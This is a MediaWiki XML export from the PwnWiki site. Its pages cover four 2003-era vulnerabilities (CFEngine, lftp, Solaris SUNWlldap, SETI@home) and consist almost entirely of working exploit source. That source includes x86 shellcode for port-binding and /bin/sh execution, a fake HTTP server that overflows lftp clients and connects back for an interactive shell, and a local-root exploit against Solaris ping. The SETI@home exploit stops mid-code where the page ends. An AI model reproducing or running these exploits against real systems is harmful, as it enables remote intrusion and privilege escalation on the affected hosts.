<mediawiki xmlns="http://www.mediawiki.org/xml/export-0.11/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.mediawiki.org/xml/export-0.11/ http://www.mediawiki.org/xml/export-0.11.xsd" version="0.11" xml:lang="chinese">
  <siteinfo>
    <sitename>PwnWiki</sitename>
    <dbname>sql_www_pwnwiki_</dbname>
    <base>https://www.pwnwiki.org/index.php?title=Main_Page</base>
    <generator>MediaWiki 1.35.1</generator>
    <case>first-letter</case>
    <namespaces>
      <namespace key="-2" case="first-letter">Media</namespace>
      <namespace key="-1" case="first-letter">Special</namespace>
      <namespace key="0" case="first-letter" />
      <namespace key="1" case="first-letter">Talk</namespace>
      <namespace key="2" case="first-letter">User</namespace>
      <namespace key="3" case="first-letter">User talk</namespace>
      <namespace key="4" case="first-letter">PwnWiki</namespace>
      <namespace key="5" case="first-letter">PwnWiki talk</namespace>
      <namespace key="6" case="first-letter">File</namespace>
      <namespace key="7" case="first-letter">File talk</namespace>
      <namespace key="8" case="first-letter">MediaWiki</namespace>
      <namespace key="9" case="first-letter">MediaWiki talk</namespace>
      <namespace key="10" case="first-letter">Template</namespace>
      <namespace key="11" case="first-letter">Template talk</namespace>
      <namespace key="12" case="first-letter">Help</namespace>
      <namespace key="13" case="first-letter">Help talk</namespace>
      <namespace key="14" case="first-letter">Category</namespace>
      <namespace key="15" case="first-letter">Category talk</namespace>
      <namespace key="274" case="first-letter">Widget</namespace>
      <namespace key="275" case="first-letter">Widget talk</namespace>
      <namespace key="710" case="first-letter">TimedText</namespace>
      <namespace key="711" case="first-letter">TimedText talk</namespace>
      <namespace key="828" case="first-letter">Module</namespace>
      <namespace key="829" case="first-letter">Module talk</namespace>
      <namespace key="1198" case="first-letter">Translations</namespace>
      <namespace key="1199" case="first-letter">Translations talk</namespace>
    </namespaces>
  </siteinfo>
  <page>
    <title>CVE-2003-0849 GNU CFEngine 2.-2.0.3 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1669</id>
    <revision>
      <id>2073</id>
      <timestamp>2021-05-03T12:40:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/perl -s # kokaninATdtors.net / cfengine2-2.0.3 from freebsd ports 26/sep/2003. # forking portbind shellcode port=0xb0ef(45295) by eSDee # bug discover..."</comment>
      <origin>2073</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1622" sha1="3cwlzarenzlilfp8qmpcrw0csxw9b29" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/perl -s
# kokaninATdtors.net / cfengine2-2.0.3 from freebsd ports 26/sep/2003.
# forking portbind shellcode port=0xb0ef(45295) by eSDee
# bug discovered by nick cleaton, tested on FreeBSD 4.8-RELEASE

use IO::Socket;
if(!$ARGV[1])
{ print "usage: ./DSR-cfengine.pl &lt;host&gt; &lt;port&gt; (default cfengine is 5308)\n"; exit(-1); }

$host = $ARGV[0];
$port = $ARGV[1];
$nop = "\x90";
$ret = pack("l",0xbfafe3dc);
$shellcode = 
"\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0".
"\x61\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\xb0\xef\xb7\x02".
"\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80".
"\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x50\x57".
"\x50\xb0\x6a\xcd\x80\x31\xc0\x31\xdb\x50\x89\xe1\xb3\x01\x53\x89".
"\xe2\x50\x51\x52\xb3\x14\x53\x50\xb0\x2e\xcd\x80\x31\xc0\x50\x50".
"\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80".
"\x39\xc3\x75\x44\x31\xc0\x57\x50\xb0\x06\xcd\x80\x31\xc0\x50\x56".
"\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x56\x50\xb0\x5a\xcd".
"\x80\x31\xc0\x43\x53\x56\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x2f".
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b".
"\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x56\x50\xb0\x06\xcd\x80".
"\xeb\x9a";


$buf = $nop x 2222 . $shellcode . $ret x 500;

$socket = new IO::Socket::INET ( 
Proto  =&gt; "tcp",
PeerAddr =&gt; $host,
PeerPort =&gt; $port, 
);

die "unable to connect to $host:$port ($!)\n" unless $socket;

sleep(1); #you might have to adjust this on slow connections
print $socket $buf;

close($socket);


# milw0rm.com [2003-09-27]
            
&lt;/pre&gt;</text>
      <sha1>3cwlzarenzlilfp8qmpcrw0csxw9b29</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0963 lftp 2.6.9 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1671</id>
    <revision>
      <id>2075</id>
      <timestamp>2021-05-03T12:45:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  * lftp remote stack-based overflow exploit by Li0n7 voila fr  *  * Vulnerability discovered by Ulf Harnhammar Ulf.Harnhammar.9485 student uu se  *  * Lftp ve..."</comment>
      <origin>2075</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11247" sha1="pmn114hzsbt0lhvyicyd62vwlftno32" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
 * lftp remote stack-based overflow exploit by Li0n7 voila fr
 *
 * Vulnerability discovered by Ulf Harnhammar Ulf.Harnhammar.9485 student uu se
 *
 * Lftp versions later than 2.6.10 are prone to a remotly exploitable stack-based
 * overflow in try_netscape_proxy() and try_squid_eplf( (src/HttpDir.cc). This
 * bad coded proof-of-concept demonstrates the exploitation by exploiting the
 * vulnerable function try_netscape_proxy() (HttpDir.cc:358) and it needs more targets
 * to be efficient. Please note that this vulnerability is really hard to exploit
 * since lots of parameters come into play and are different from a platform to another,
 * for we have to overwrite some variables and registers before overwriting eip.
 * With some time and lot of patience, you should find your own parameters by using
 * GDB. Params to edit are marked with a '!' in the POC code. Moreover, I have edited
 * Bighawk's port binding shellcode not to contain any white character such as \r,\t,\v,
 * \f,\n or \20 because we are exploiting a sscanf function.
 *
 * usage: ./lftp-exp [-f &lt;path&gt;][-p &lt;port&gt;][-r &lt;ret&gt;][-t &lt;target&gt;]
 * -f &lt;path&gt;: create &lt;path&gt;index.html
 * -p &lt;port&gt;: run a fake lftp server on port &lt;port&gt; (default: 80)
 * -r &lt;ret&gt;: return address you would like to use
 * -t &lt;target&gt;: choose the target among the platforms available
 * Platforms supported are:
 * num: 0 - slack 9.0 - 0xbffff770
 *
 * For instance: ./lftp-exp -p 80 -t 0
 * ./lftp-exp -f / -t 0
 *
 * A poil !
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

#define BUFFERSIZE 117 /*!*/
#define SIZE 256

#define D_BACK 26112
#define D_RET 0xbffff770
#define D_PORT 80

#define DUMMY1 0xbffff140 /*!*/
#define DUMMY2 0xbffff810 /*!*/

#define OK "cd ok, cwd=/\n"


/* Edited bighawk 78 bytes portbinding shellcode */
/* size: 80 bytes */
/* Does not contain any white character i.e \r,\t,\v,\f,\n,\20 */

char shellcode[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
"\x66\x52\x50\xcd\x80\x43\x66\x53\x89\xe1\x6a\x10"
"\x51\x50\x89\xe1\x52\x50\xb0\x66\xcd\x80\x89\xe1"
"\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x89"
"\xd9\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x6e"
"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53"
"\x89\xe1\xb0\x28\x2c\x1d\xcd\x80";

char badc0ded[] =
{0x20,0x09,0x0a,0x0b,0x0c,0x0d,0x00};

char *lftp_versions[] =
{
  "lftp/2.3",
  "lftp/2.4.9",
  "lftp/2.5.2",
  "lftp/2.6.0",
  "lftp/2.6.3",
  "lftp/2.6.4",
  "lftp/2.6.5",
  "lftp/2.6.6",
  "lftp/2.6.7",
  "lftp/2.6.8",
  "lftp/2.6.9",
   
};

unsigned long ret_addr = D_RET;

int back_connection(long host);
int check_shellcode(char *host);
void check_version();
char * build(char *host);
int create_file(char *path);
void wait_connection(int port);
long resolve_host(u_char *host_name);
void die(char *argv);

struct os_ret_addr
{
  int num;
  char *plat;
  long ret;
};

struct os_ret_addr exp_os[]=
{
  {0,"slack 9.0",0xbffff770},
  {0,NULL,0}
};


int
main(int argc,char *argv[])
{
  int i, option, port = D_PORT;
  long host = 0;
  char * option_list = "f:p:r:t:", path[128];

  opterr = 0;

  if (argc &lt; 2) die(argv[0]);
  while((option = getopt(argc,argv,option_list)) != -1)
    switch(option)
    {
      case 'f':
      strncpy(path,optarg,sizeof(path)-1);
      path[sizeof(path)-1] = '\0';
      create_file(path);
      return 0;
      case 'p':
      port = atoi(optarg);
      if(port &gt; 65535 || port &lt; 0) exit(-1);
      break;
      case 'r':
      ret_addr = atol(optarg);
      if(ret_addr &gt; 0xbfffffff || ret_addr &lt; 0x00000000) exit(1);
      break;
      case 't':
      for(i=0; exp_os[i].plat != NULL; i++)
      if(atoi(optarg) &gt; i || atoi(optarg) &lt; 0)
      {
        fprintf(stderr," Platforms supported are:\n");
        for(i=0; exp_os[i].plat != NULL; i++)
          fprintf(stderr," num: %i - %s - 0x%x\n",i,exp_os[i].plat,exp_os[i].ret);
          exit(1);
      }
      ret_addr = exp_os[atoi(optarg)].ret;
      break;
      case '?':
      fprintf(stderr,"[-] option \'%c\' invalid\n",optopt);
      die(argv[0]);
    }
 
  wait_connection(port);
  return 0;
}


int
check_shellcode(char *host)
{
  int i,j;
  for(i=0;i&lt;strlen(shellcode);i++)
    for(j=0;j&lt;strlen(badc0ded);j++)
      if(shellcode[i] == badc0ded[j])
      {
      fprintf(stderr,"[%s] badc0ded shellcode!\n",host);
      return -1;
      }
  return 0;
}


void
check_version(char *version)
{
  int i;
  for(i=0;i&lt;sizeof(lftp_versions);i++)
    if(!strcmp(lftp_versions[i],version))
    {
      fprintf(stdout,"(vulnerable).\n");
      return;
    }
  fprintf(stdout,"(not vulnerable).\n");
  return;
}


char
*build(char *host)
{
  char *buffer,*ptr;
  int i;
  unsigned long *addr_ptr;

  fprintf(stdout,"[%s] Building evil string to send (using ret 0x%x)...\n",host,ret_addr);

  buffer = (char *)malloc(SIZE+1);

  if(!buffer)
  {
    fprintf(stderr,"[-] Can't allocate memory,exiting...\n");
    exit(1);
  }

  ptr = buffer;
  memset(ptr,0x90,BUFFERSIZE-strlen(shellcode));
  ptr += BUFFERSIZE-strlen(shellcode);

  if((i = check_shellcode(host)) &lt; 0) exit(1);

  for(i=0;i&lt;strlen(shellcode);i++)
    *ptr++ = shellcode[i];

  /* You might need to modify the padding too */
  addr_ptr = (long *)ptr;
  for(i=0;i&lt;24;i++)
   *(addr_ptr++) = DUMMY1;
  for(i=0;i&lt;8;i++)
   *(addr_ptr++) = DUMMY2;
  *(addr_ptr++) = ret_addr; /* EIP */
  *(addr_ptr++) = DUMMY2;

  ptr = (char *)addr_ptr;
  *ptr = 0x0;
  return buffer;
}


int
create_file(char *path)
{
  int fd;
  char buffer[512], file[256];
  ssize_t written;

  memset(file,0,256);
  memset(buffer,0,512);

  strcat(file,path);
  strcat(file,"index.html");

  fd = open(file,O_WRONLY | O_CREAT | O_TRUNC,0644);
  if(fd &lt; 0)
  {
    fprintf(stderr,"[-] %s\n",strerror(errno));
    exit(0);
  }
  snprintf(buffer,512,"&lt;a href=\"/\"&gt;empty&lt;/a&gt; Fri May 30 10:09:06 2001 %s\n",build("+"));
  written = write(fd,buffer,512);
  if(written != 512)
  {
    fprintf(stderr,"[-] %s\n",strerror(errno));
    exit(0);
  }
  close(fd);
  fprintf(stdout,"[+] File %s successfuly created.\n",file);
  return 0;
}


int
back_connection(long host)
{
  struct sockaddr_in s;
  u_char sock_buf[4096];
  fd_set fds;
  int fd,size;
  char *command="/bin/uname -a ; /usr/bin/id;\n";

  fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd &lt; 0)
  {
    fprintf(stderr,"[-] %s\n",strerror(errno));
    exit(1);
  }

  s.sin_family = AF_INET;
  s.sin_port = htons(D_BACK);
  s.sin_addr.s_addr = host;

  if (connect(fd, (struct sockaddr *)&amp;s, sizeof(struct sockaddr)) == -1)
  {
    fprintf(stderr,"[-] %s\n",strerror(errno));
    close(fd);
    return 0;
  }

  fprintf(stdout, "[+] Let's rock on!\n");

  size = send(fd, command, strlen(command), 0);
  if(size &lt; 0)
  {
    fprintf(stderr,"[-] %s\n",strerror(errno));
    close(fd);
    exit(1);
  }

  for (;;)
  {
    FD_ZERO(&amp;fds);
    FD_SET(0, &amp;fds);
    FD_SET(fd, &amp;fds);

    if (select(255, &amp;fds, NULL, NULL, NULL) == -1)
    {
      fprintf(stderr,"[-] %s\n",strerror(errno));
      close(fd);
      exit(1);
    }

    memset(sock_buf, 0, sizeof(sock_buf));

    if (FD_ISSET(fd, &amp;fds))
    {
      if (recv(fd, sock_buf, sizeof(sock_buf), 0) == -1)
      {
      fprintf(stderr, "[-] Connection closed by remote host,exiting...\n");
      close(fd);
      exit(1);
      }

      fprintf(stderr, "%s", sock_buf);
    }

    if (FD_ISSET(0, &amp;fds))
    {
      read(0, sock_buf, sizeof(sock_buf));
      write(fd, sock_buf, strlen(sock_buf));
    }
  }
  return 0;
}


void
wait_connection(int port)
{
  struct sockaddr_in s;
  int size, fd, fd2, i, r, cancel = 0;
  char data[1024], version[32], request[512];
  char *ptr;
  long host = 0;

  memset(data,0,1024);

  fprintf(stdout,"[+] Setting up a fake HTTP server...\n");
 
  fd = socket(AF_INET,SOCK_STREAM,0);
  if(fd &lt; 0)
  {
    fprintf(stderr,"[-] %s\n",strerror(errno));
    exit(1);
  }

  s.sin_family = AF_INET;
  s.sin_port = htons(port);
  s.sin_addr.s_addr = 0;

  bind(fd,(struct sockaddr *) &amp;s,sizeof(s));
  listen(fd,1);
  size = sizeof(s);
  
  fprintf(stdout,"[+] Awaiting connection on port %i\n",port);

  while(1)
  {
    cancel = 0;
    fd2 = accept(fd,(struct sockaddr *) &amp;s, &amp;size);

    if(!fork())
    {
      close(fd);
      while(1)
      {
      memset(data,0,1024);
      r = read(fd2,data,1024);
      if((ptr = strstr(data,"User-Agent: lftp")) != NULL)
      {
        if(strstr(data,"HEAD"))
        {
          fprintf(stdout,"[%s] HEAD request received.\n",inet_ntoa(s.sin_addr));
          size = send(fd2, OK, strlen(OK), 0);
          if(size &lt; 0)
          {
          fprintf(stderr,"[-] %s\n",strerror(errno));
          close(fd2);
          exit(1);
          }
        }
        if(strstr(data,"GET"))
        {
          memset(request,0,512);
          memset(version,0,32);

          strncpy(version,ptr+12,10);
          version[sizeof(version)-1] = '\0';

          fprintf(stdout,"[%s] GET request received.\n",inet_ntoa(s.sin_addr));
          fprintf(stdout,"[%s] Remote version of lftp: %s ",inet_ntoa(s.sin_addr),version);
          check_version(version);

          snprintf(request,512,"HTTP/1.1 200 OK\n"
                 "Server: thttpd/2.21 20apr2001\n"
                 "Content-Type: text/html\n"
                 "Date: Sun, 21 Dec 2003 16:29:44 GMT\n"
                 "Last-Modified: Sun, 21 Dec 2003 16:23:41 GMT\n"
                 "Accept-Ranges: bytes\n"
                 "Connection: close\n\n"
                 "&lt;a href=\"/\"&gt;empty&lt;/a&gt;\tFri May 30 10:09:06 2001 %s\n",build((char*)inet_ntoa(s.sin_addr)));

          size = send(fd2, request, strlen(request), 0);
          if(size &lt; 0)
          {
          fprintf(stderr,"[-] %s\n",strerror(errno));
          close(fd2);
          exit(1);
          }
          sleep(2);
          host = resolve_host((char *)inet_ntoa(s.sin_addr));
          back_connection(host);
          cancel = 1;
          break;
        }
      }
      }
      if(cancel == 1) break;
    }
    close(fd2);
  }
  return;
}


long resolve_host(u_char *host_name)
{
  struct in_addr addr;
  struct hostent *host_ent;

  addr.s_addr = inet_addr(host_name);
  if (addr.s_addr == -1)
  {
    host_ent = gethostbyname(host_name);
    if (!host_ent) return(0);
    memcpy((char *)&amp;addr.s_addr, host_ent-&gt;h_addr, host_ent-&gt;h_length);
  }

  return(addr.s_addr);
}


void
die(char *argv)
{
  int i;
  fprintf(stdout,"\t Remote exploit for lftp &lt; 2.6.10 by Li0n7 \n");
  fprintf(stdout,"\n usage: %s [-f &lt;path&gt;][-p &lt;port&gt;][-r &lt;ret&gt;][-t &lt;target&gt;]\n",argv);
  fprintf(stdout," -f &lt;path&gt;: create &lt;path&gt;index.html\n");
  fprintf(stdout," -p &lt;port&gt;: run a fake lftp server on port &lt;port&gt; (default: 80)\n");
  fprintf(stdout," -r &lt;ret&gt;: return address you would like to use\n");
  fprintf(stdout," -t &lt;target&gt;: choose the target among the platforms available\n");
  fprintf(stdout," Platforms supported are:\n");
  for(i=0; exp_os[i].plat != NULL; i++)
    fprintf(stderr," num: %i - %s - 0x%x\n",i,exp_os[i].plat,exp_os[i].ret);
  fprintf(stdout,"\n Vulnerability discovered by Ulf Harnhammar &lt;Ulf.Harnhammar.9485@student.uu.se&gt; \n");
  fprintf(stdout," Contact me: Li0n7@voila.fr\n\n");
  exit(1);
}


// milw0rm.com [2004-01-14]
            
&lt;/pre&gt;</text>
      <sha1>pmn114hzsbt0lhvyicyd62vwlftno32</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-1055 Sun SUNWlldap Library Hostname 本地緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1659</id>
    <revision>
      <id>2063</id>
      <timestamp>2021-05-03T12:28:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*********************************************************** * hoagie_solarisldap.c * * gcc hoagie_solarisldap.c -o hoagie_solarisldap * * Author: Andi &lt;andi@voi..."</comment>
      <origin>2063</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2846" sha1="sz0mr4pty1m4v3iug1uprlhs544bhn2" xml:space="preserve">==EXP==
&lt;pre&gt;
/***********************************************************
* hoagie_solarisldap.c
*
* gcc hoagie_solarisldap.c -o hoagie_solarisldap
*
* Author: Andi &lt;andi@void.at&gt;
*
* Greetz to Greuff, philipp and the other hoagie-fellas :-)
*
* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
* DAMAGE DONE USING THIS PROGRAM.
*
*
* Offsets: 9208 ... without patch 108994-11
*
************************************************************/

#include &lt;stdio.h&gt;

#define NOP 0x90
#define ORIGSIZE 258

char shellcode[]=
/* main: */
"\xeb\x0a" /* jmp initcall */

/* initlcall: */
"\x9a\x01\x02\x03\x5c\x07\x04" /* lcall */
"\xc3" /* ret */

/* jmpz: */
"\xeb\x05" /* jmp setuidcode */

/* initcall: */
"\xe8\xf9\xff\xff\xff" /* call jmpz */

/* setuidcode: */
"\x5e" /* popl %esi */
"\x29\xc0" /* subl %eax, %eax */
"\x88\x46\xf7" /* movb %al, 0xfffffff7(%esi) */
"\x89\x46\xf2" /* movl %eax, 0xfffffff2(%esi) */

/* seteuid(0); */
"\x50" /* pushl %eax */
"\xb0\x8d" /* movb $0x8d, %al */
"\xe8\xe0\xff\xff\xff" /* call initlcall */
/* setuid(0); */
"\x29\xc0" /* subl %eax, %eax */
"\x50" /* pushl %eax */
"\xb0\x17" /* movb $0x17, %al */
"\xe8\xd6\xff\xff\xff" /* call initlcall */

"\xeb\x1f" /* jmp callz */

/* start: */
/* execve /bin/sh */
"\x5e" /* popl %esi */
"\x8d\x1e" /* leal (%esi), %ebx */
"\x89\x5e\x0b" /* movl %ebx, 0x0b(%esi) */
"\x29\xc0" /* subl %eax, %eax */
"\x88\x46\x19" /* movb %al, 0x19(%esi) */
"\x89\x46\x14" /* movl %eax, 0x14(%esi) */
"\x89\x46\x0f" /* movl %eax, 0x0f(%esi) */
"\x89\x46\x07" /* movl %eax, 0x07(%esi) */
"\xb0\x3b" /* movb $0x3b, %al */
"\x8d\x4e\x0b" /* leal 0x0b(%esi), %ecx */
"\x51" /* pushl %ecx */
"\x51" /* pushl %ecx */
"\x53" /* pushl %ebx */
"\x50" /* pushl %eax */
"\xeb\x18" /* jmp lcall */

/* callz: */
"\xe8\xdc\xff\xff\xff" /* call start */

"\x2f\x62\x69\x6e\x2f\x73\x68" /* /bin/sh */
"\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"

/* lcall: */
"\x9a\x04\x04\x04\x04\x07\x04"; /* lcall */



unsigned long getsp(void)
{
__asm__(" movl %esp,%eax ");
}

int main(int argc, char **argv) {
char buf[512];
int offset = 9208;
int retaddr = 0;
int i;

if (argc &gt; 1) {
sscanf(argv[1], "%d", &amp;offset);
}

printf("hoagie_solarisldap local root exploit\n");
printf("[*] offset: 0x%x\n", offset);

memset(buf, NOP, sizeof(buf));
buf[28] = 0xeb;
buf[29] = 30;
for (i = 0; i &lt; strlen(shellcode); i++) {
buf[i + 60] = shellcode[i];
}

retaddr = getsp() - offset;
printf("[*] return address: 0x%x\n", retaddr);

for (i = 0; i &lt; 4 * 25; i += 4){
buf[i + ORIGSIZE + 2] = retaddr &amp; 0xff;
buf[i + ORIGSIZE + 3] = (retaddr &gt;&gt; 8 ) &amp;0xff;
buf[i + ORIGSIZE + 0] = (retaddr &gt;&gt; 16 ) &amp;0xff;
buf[i + ORIGSIZE + 1] = (retaddr &gt;&gt; 24 ) &amp;0xff;
}

execl("/usr/sbin/ping", "ping", buf, NULL);
}


// milw0rm.com [2003-04-01]
            
&lt;/pre&gt;</text>
      <sha1>sz0mr4pty1m4v3iug1uprlhs544bhn2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-1118 SETI@home Clients 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1656</id>
    <revision>
      <id>2060</id>
      <timestamp>2021-05-03T12:26:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*    Seti@Home exploit by zillion[at]safemode.org (2003/01/07)     Credits for the vulnerability go to: SkyLined &lt;SkyLined@edup.tudelft.nl&gt;    http://spoor12.ed..."</comment>
      <origin>2060</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6386" sha1="dk54tkgoqjf11s8gltibdv3l6f0m2kg" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
   Seti@Home exploit by zillion[at]safemode.org (2003/01/07)

   Credits for the vulnerability go to: SkyLined &lt;SkyLined@edup.tudelft.nl&gt;
   http://spoor12.edup.tudelft.nl/SkyLined%20v4.2/?Advisories/Seti@home

   Use this exploit in combination with a DNS spoofing utility such as the one
   provided in the Dsniff package. http://naughty.monkey.org/~dugsong/dsniff/

*/

#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;

#define NOP 0x41
#define EXEC "TERM=xterm; export TERM=xterm;exec /bin/sh -i"
#define EXEC2 "id;uname -a;"

char linux_shellcode[] =

   /* dup */
   "\x31\xc9\x31\xc0\x31\xdb\xb3\x04\xb0\x3f\xcd\x80\xfe\xc1\xb0"
   "\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80"


   /* execve /bin/sh */
   "\x31\xdb\x31\xc9\xf7\xe3\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
   "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";


char freebsd_shellcode[] =

  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb1\x03\xbb\xff\xff\xff\xff"
  "\xb2\x04\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01\x75\xf3"

  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
  "\xb0\x3b\x50\xcd\x80";

char static_crap[] =

   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

struct target
{
  int   num;
  char *description;
  char *versions;
  char *type;
  char *shellcode;
  long  retaddress;
  int   bufsize;
  int   offset;
  int   junk;
};

struct target targets[] =
{
  {0,  "Linux  2.2.* ", "3.03.i386      linux-gnu-gnulibc2.1 ", "Packet retr mode", linux_shellcode,
   0xbffff420, 520, 500, 0},
  {1,  "Linux  2.4.* ", "3.03 i386/i686 linux-gnu-gnulibc2.1 ", "Packet retr mode", linux_shellcode,
   0xbffff390, 520, 500, 1},
  {2,  "Linux  2.*   ", "3.03.i386/i686 linux-gnulibc1-static", "Packet retr mode", linux_shellcode,
  0xbffff448, 520, 500, 1},
  {3,  "All above    ", "3.03.i386      linux*               ", "Packet retr mode", linux_shellcode,
   0xbffff448, 520, 300, 1},
  {4,  "FreeBSD      ", "3.03.i386      FreeBSD-2.2.8        ", "Packet retr mode", freebsd_shellcode,
 0x0004956c, 520, 1, 2},
  {5, NULL, NULL, NULL, NULL, 0, 0, 0}
};

int open_socket(int port)
{

  int sock,fd;
  struct sockaddr_in cliAddr, servAddr;

  sock = socket(AF_INET, SOCK_STREAM, 0);
   if(sock&lt;0) {
    printf("Error: Cannot open socket \n");
    exit(1);
  }

  /* bind server port */
  servAddr.sin_family = AF_INET;
  servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servAddr.sin_port = htons(port);

  if(bind(sock, (struct sockaddr *) &amp;servAddr, sizeof(servAddr))&lt;0) {
    printf("Error: Cannot bind to port %d \n",port);
    exit(1);
  }

  listen(sock,5);
  fd=accept(sock,0,0);

  return fd;
}

void usage(char *progname) {

  int i;

  printf("\n---------------------------------------------------");
  printf("\n  *- Seti@Home remote exploit by zillion (s-m0de) -*");
  printf("\n---------------------------------------------------");
  printf("\n\nDefault      : %s  -h &lt;target host&gt;",progname);
  printf("\nTarget       : %s  -t &lt;number&gt;",progname);
  printf("\nOffset       : %s  -o &lt;offset&gt;",progname);
  printf("\nPort         : %s  -p &lt;port&gt;\n",progname);
  printf("\nDebug        : %s  -d \n",progname);

  printf("\nAvailable types:\n");
  printf("---------------------------------------------------\n");
  for(i = 0; targets[i].description; i++) {
    fprintf(stdout, "%d\t%s\t%s\t%s\n", targets[i].num, targets[i].description,targets[i].
versions,targets[i].type);
  }
  printf("\n\n");
  exit(0);
}

int sh(int sockfd) {
  char snd[1024], rcv[1024];
  fd_set rset;
  int maxfd, n,test;

  strcpy(snd, EXEC "\n");
  write(sockfd, snd, strlen(snd));

  read(sockfd,rcv,7);
  fflush(stdout);

  strcpy(snd, EXEC2 "\n");
  write(sockfd, snd, strlen(snd));

  /* Main command loop */
  for (;;) {
    FD_SET(fileno(stdin), &amp;rset);
    FD_SET(sockfd, &amp;rset);

    maxfd = ( ( fileno(stdin) &gt; sockfd )?fileno(stdin):sockfd ) + 1;
    select(maxfd, &amp;rset, NULL, NULL, NULL);

    if (FD_ISSET(fileno(stdin), &amp;rset)) {
      bzero(snd, sizeof(snd));
      fgets(snd, sizeof(snd)-2, stdin);
      write(sockfd, snd, strlen(snd));
    }

    if (FD_ISSET(sockfd, &amp;rset)) {
      bzero(rcv, sizeof(rcv));

      if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	/* exit */
	return 0;
      }

      if (n &lt; 0) {
	perror("read");
	return 1;
      }

      fputs(rcv, stdout);
      fflush(stdout);
    }
  } /* for(;;) */
}


int main(int argc, char **argv){

  char *buffer,*tmp;
  long retaddress;
  char rcv[200];
  int fd,i,arg,debug=0,type=0,port=80,offset=250;

  if(argc &lt; 2) { usage(argv[0]); }

  while ((arg = getopt (argc, argv, "dh:o:l:p:t:")) != -1){
    switch (arg){
    case 'd':
	debug = 1;
	break;
    case 'o':
      offset = atoi(optarg);
      break;
    case 'p':
      port = atoi(optarg);
      break;
    case 't':
      type = atoi(optarg);
      break;
    default :
      usage(argv[0]);
    }
  }

  if((targets[type].retaddress) != 0) {
    buffer = (char *)malloc((targets[type].bufsize));

    /* some junk may be required to counter buffer manipulation */

    if(targets[type].junk == 1) {

    tmp = (char *)malloc(strlen(static_crap) + strlen(targets[type].shellcode));

    strcpy(tmp,targets[type].shellcode);
    strcat(tmp,static_crap);

    targets[type].shellcode = tmp;

    }

    memset(buffer,NOP,targets[type].bufsize);
    memcpy(buffer + (targets[type].bufsize) - (strlen(targets[type].shellcode) + 8) ,targets[type].
shellcode,strlen(targets[type].shellcode));

    /* Overwrite EBP and EIP */
    *(long *)&amp;buffer[(targets[type].bufsize) - 8]  = (targets[type].retaddress - targets[type].offset);


    // If freebsd we need to place a value without 00 in ebp

    if(type == 4) {
       *(long *)&amp;buffer[(targets[type].bufsize) - 8]  = 0xbfbff654;
    }

    *(long *)&amp;buffer[(targets[type].bufsize) - 4]  = (targets[type].retaddress - targets[type].offset);

    /* Uncomment to overwrite eip and ebp with 41414141 */
    if(debug == 1) {
